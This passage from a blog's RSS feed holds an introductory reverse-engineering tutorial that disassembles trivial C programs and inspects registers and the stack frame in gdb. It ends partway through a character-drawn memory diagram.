</span></span><span class="line"><span class="cl">        <span class="nf">sub</span>     <span class="no">rsp</span><span class="p">,</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="no">edi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">esi</span><span class="p">,</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:.</span><span class="no">LC0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">printf</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">leave</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; func(5);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">func</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; func(6);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="mi">6</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">func</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; func(7);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="mi">7</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">func</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; func(8);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">func</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>That&rsquo;s it for today. In the next article, I&rsquo;ll try to use all our knowledge we have gathered till now to reverse engineer a very simple calculator program.</p>
<p><img loading="lazy" src="https://media.giphy.com/media/3ZZVfvtxywq9dIGZM0/giphy.gif#center" alt=""  />
</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="https://godbolt.org/">https://godbolt.org/</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p><a href="https://stackoverflow.com/questions/6212665/why-is-eax-zeroed-before-a-call-to-printf">https://stackoverflow.com/questions/6212665/why-is-eax-zeroed-before-a-call-to-printf</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Intro to RE: C : part-2</title>
      <link>https://ayedaemon.github.io/post/2023/03/intro-to-re-part-2/</link>
      <pubDate>Sun, 19 Mar 2023 22:07:39 +0530</pubDate>
      <guid>https://ayedaemon.github.io/post/2023/03/intro-to-re-part-2/</guid>
      <description>How to reverse engineer a basic C program</description>
      <content:encoded><![CDATA[<p>Reverese engineering is a powerful tool for any software developer. However, as with any tool, it is only as good as the person using it. Understanding reverse engineering and how to use it is essential for both novices and seasoned developers.</p>
<p>According to wikipedia,</p>
<blockquote>
<p>Reverse engineering, also called back engineering, is the process by which a man-made object is deconstructed to reveal its designs, architecture, or to extract knowledge from the object; similar to scientific research, the only difference being that scientific research is about a natural phenomenon.</p>
</blockquote>
<p>Because there will be a lot of new things, I&rsquo;m attempting to keep this article more practical and experimental&hellip;I encourage you to follow along and experiment with your own examples as well.</p>
<p><img loading="lazy" src="https://media.giphy.com/media/109fP7pua6Osgw/giphy.gif#center" alt=""  />
</p>
<p>The following is a very simple C program that starts the <code>main()</code> function and exits by returning a value <code>0</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>This source code will be compiled to create an executable binary file. When we disassemble the compiled binary, we get something like this&hellip;</p>
<p>(Note: There are <a href="https://en.wikipedia.org/wiki/Disassembler#Examples_of_disassemblers">many disassemblers</a> <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> you can use. Nearly all the disassembled instructions in this blog were produced with <a href="https://godbolt.org/">godbolt</a>)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>In this example, function <code>prologue</code> and <code>epilogue</code> are the first two and last two instructions, respectively. These are used to build a frame for a function. This frame contains all of the local variables used or defined in this function.</p>
<p>Whenever a function is created, a new frame is created, all the local variables are stored in respective memory blocks inside this frame and finally the frame is discarded when the function returns.</p>
<p>We&rsquo;ll go into more detail about this later, but for now, just remember that there are <code>prologue</code> and <code>epilogue</code> instructions that mark the beginning and end of a function.</p>
<p>With this out of the picture, the instruction at line 4 appears to be in charge of returning <code>0</code> to the caller function (whoever called <code>main()</code>).</p>
<p>The idea is to use the <code>eax</code> register as a storage area for return values. When a function returns something, it simply stores the value in the <code>eax</code>/<code>rax</code> register so that the caller function can read it later if necessary.</p>
<p>Now we know some background theory, let&rsquo;s try to change the return value and see how our assembly instructions reflect the change.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The assembly instructions for the above code are nearly identical to the previous one, with the exception of the return value at <code>line 4</code>. Now eax register stores the value <code>6</code> instead of <code>0</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">6</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>If you are familiar with basic C programming, you know that we can avoid returning value by changing the return type of the function <code>main()</code> from <code>int</code> to <code>void</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{}</span>
</span></span></code></pre></div><p>No return statements here! So we can safely assume that the disassembly for this function should consist only of a <code>prologue</code> and an <code>epilogue</code>, with <strong>no</strong> <code>mov eax 0</code> kind of instructions.</p>
<p>Why?? No <code>return</code> statements in the source code, so no need to store anything in <code>eax</code> register. Save some CPU cycles. Makes sense, right? Let&rsquo;s check!!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>The <code>prologue</code> and <code>epilogue</code> can be seen in the above disassembly, along with a new instruction <code>nop</code> that does nothing. A <code>nop</code> statement in C is a null statement that can be a semicolon (<code>;</code>), an empty block (<code>{}</code>), or any other equivalent statement.</p>
<p>If you&rsquo;re a Pythonista, you&rsquo;re already familiar with the <code>pass</code> statement, which has no effect when executed. This serves as a <code>nop</code> in python language.</p>
<p>In the disassembly, we now know what the <code>prologue</code>, <code>epilogue</code>, and <code>return</code> statement look like. Let’s see what variables look like when disassembled.</p>
<p>Everything in the following code is identical to the previous example; the only statement added here is an <code>int</code> variable definition.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>We have already established that all the local variables for a function are created inside the function frame (which starts with a <code>prologue</code> and ends with an <code>epilogue</code>). With that in mind, let&rsquo;s take a look at the disassembly for this source code.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>A new instruction detected - <code>mov     DWORD PTR [rbp-4], 1</code>. This is storing value <code>1</code> at some location pointed by <code>rbp-4</code>. To gain a better understanding of how that works, we&rsquo;ll have to take a detour so that we can debug the binary and see the registers and memory in action.</p>
<p>I&rsquo;ll start <code>gdb</code> with the compiled version of the above source code, and then disassemble the main function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; disas main
</span></span><span class="line"><span class="cl">Dump of assembler code for function main:
</span></span><span class="line"><span class="cl">   0x0000555555555119 &lt;+0&gt;:     push   rbp
</span></span><span class="line"><span class="cl">   0x000055555555511a &lt;+1&gt;:     mov    rbp,rsp
</span></span><span class="line"><span class="cl">=&gt; 0x000055555555511d &lt;+4&gt;:     mov    DWORD PTR [rbp-0x4],0x1
</span></span><span class="line"><span class="cl">   0x0000555555555124 &lt;+11&gt;:    nop
</span></span><span class="line"><span class="cl">   0x0000555555555125 &lt;+12&gt;:    pop    rbp
</span></span><span class="line"><span class="cl">   0x0000555555555126 &lt;+13&gt;:    ret
</span></span><span class="line"><span class="cl">End of assembler dump.
</span></span></code></pre></div><p>In this scenario, I&rsquo;m at the <code>mov DWORD PTR [rbp-0x4],0x1</code> instruction. That means, <code>rip</code> register is pointing to this instruction, which means this will be the next instruction executed by the CPU. We can also confirm this by checking the value stored in <code>rip</code> register.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; p/x $rip
</span></span><span class="line"><span class="cl">$1 = 0x55555555511d
</span></span></code></pre></div><p>See, told ya!</p>
<p><img loading="lazy" src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNGZjOTIyNThjNDdmOTFmZDcyMjYxZDE3ZjIxYmU3MmZiNmMxYTBiNCZjdD1n/DT3gYifPXBt5voafS1/giphy.gif#center" alt=""  />
</p>
<p>Now, let&rsquo;s print the value from <code>rbp</code> register to figure out where the <code>0x1</code> will be stored eventually.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; p/x $rbp
</span></span><span class="line"><span class="cl">$2 = 0x7fffffffdbd0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; p/x $rbp-4
</span></span><span class="line"><span class="cl">$3 = 0x7fffffffdbcc
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; p/x (int *)($rbp-4)
</span></span><span class="line"><span class="cl">$4 = 0x7fffffffdbcc
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; p/x *(int *)($rbp-4)
</span></span><span class="line"><span class="cl">$5 = 0x7fff
</span></span></code></pre></div><p>The last value is the current value at the location pointed by <code>rbp-4</code> memory location. Consider the below mindmap diagram to get a clear picture.</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 904 681"
      >
      <g transform='translate(8,16)'>
<text text-anchor='middle' x='48' y='372' fill='currentColor' style='font-size:1em'>R</text>
<text text-anchor='middle' x='56' y='372' fill='currentColor' style='font-size:1em'>B</text>
<text text-anchor='middle' x='56' y='388' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='56' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='56' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='56' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='56' y='452' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='64' y='372' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='64' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='372' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='80' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='420' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='80' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='372' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='88' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='420' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='88' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='372' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='96' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='420' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='96' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='372' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='104' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='420' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='104' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='372' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='112' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='420' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='112' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='372' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='120' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='420' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='120' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='372' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='128' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='420' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='128' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='372' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='136' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='420' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='136' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='420' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='144' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='420' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='152' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='420' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='160' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='420' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='168' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='420' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='176' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='420' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='184' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='388' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='208' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='208' y='420' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='208' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='208' y='452' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='216' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='292' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='264' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='420' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='272' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='292' fill='currentColor' style='font-size:1em'>►</text>
<text text-anchor='middle' x='480' y='292' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='480' y='436' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='488' y='292' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='488' y='436' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='496' y='292' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='496' y='436' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='504' y='292' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='504' y='436' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='512' y='292' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='512' y='436' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='520' y='292' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='520' y='436' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='528' y='292' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='528' y='436' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='536' y='292' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='536' y='436' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='544' y='292' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='544' y='436' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='552' y='292' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='552' y='436' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='560' y='292' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='560' y='436' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='568' y='292' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='568' y='436' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='576' y='292' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='576' y='436' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='584' y='292' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='584' y='436' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='608' y='132' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='608' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='276' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='608' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='308' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='608' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='340' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='608' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='372' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='608' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='404' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='608' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='452' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='608' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='516' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='532' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='548' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='564' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='580' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='596' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='612' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='628' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='644' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='660' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='616' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='452' fill='currentColor' style='font-size:1em'>─</text>
